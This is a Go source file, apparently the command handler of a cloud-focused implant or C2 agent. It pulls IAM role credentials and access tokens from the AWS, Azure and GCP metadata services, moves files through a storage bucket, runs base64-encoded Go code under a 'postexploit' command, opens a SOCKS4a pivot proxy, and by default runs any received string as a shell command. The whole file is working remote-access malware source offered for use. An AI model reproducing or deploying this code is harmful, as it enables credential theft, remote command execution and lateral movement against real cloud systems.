package main

import (
    "strings"
    "os/exec"
)

func commands(commandString string, particleName string, kmsKeyID string) string {
    if commandString == "aws_meta_data" {
        roleName := awsIMDS("iam/security-credentials")
        if roleName != ""{
            roleCreds := awsIMDS("iam/security-credentials/" + roleName)
            return "Instance Profile Credentials: " + roleCreds + "\n"
        } else {
            return "No Instance Profile Attached to EC2 Instance\n"
        }

    }else if commandString == "azure_meta_data" {
        var mgmtToken = azureIMDS("https://management.azure.com/")
        var graphToken = azureIMDS("https://graph.microsoft.com/")
        return "Mgmt: " + mgmtToken + " | Graph: " + graphToken

    }else if commandString == "gcp_meta_data" {
        return gcpIMDS()

    }else if strings.Split(commandString,` `)[0] == "upload" {
        var sourceKey = strings.Split(commandString,` `)[1]
        var destFile = strings.Split(commandString,` `)[2]

        return upload(sourceKey, destFile, particleName, bucket)

    }else if strings.Split(commandString,` `)[0] == "download" {
        var sourceFile = strings.Split(commandString,` `)[1]
        var destKey = strings.Split(commandString,` `)[2]

        return download(sourceFile, destKey, particleName, bucket, kmsKeyID)

    }else if commandString == "check_env" {
        return check_env()

    }else if strings.Split(commandString,` `)[0] == "postexploit" {
        code, _ := decodeBase64(strings.Split(commandString,` `)[1])
        codeoutput := runGoCode(code)
        return codeoutput

    }else if strings.Split(commandString,` `)[0] == "socks4a" {
        var target = strings.Split(commandString,` `)[1]
        var mgmtserver = strings.Split(target,`:`)[0] + ":9002"
        go startSocks4aServer(target, mgmtserver)
        return "Started SOCKS"

    }else{
        commands := strings.Split(commandString, " ")
        command := commands[0]
        args := commands[1:]
        cmd := exec.Command(command, args...)
        output, err := cmd.CombinedOutput()

        if err != nil {
            return err.Error()
        } else {
            return string(output)
        }
    }
}
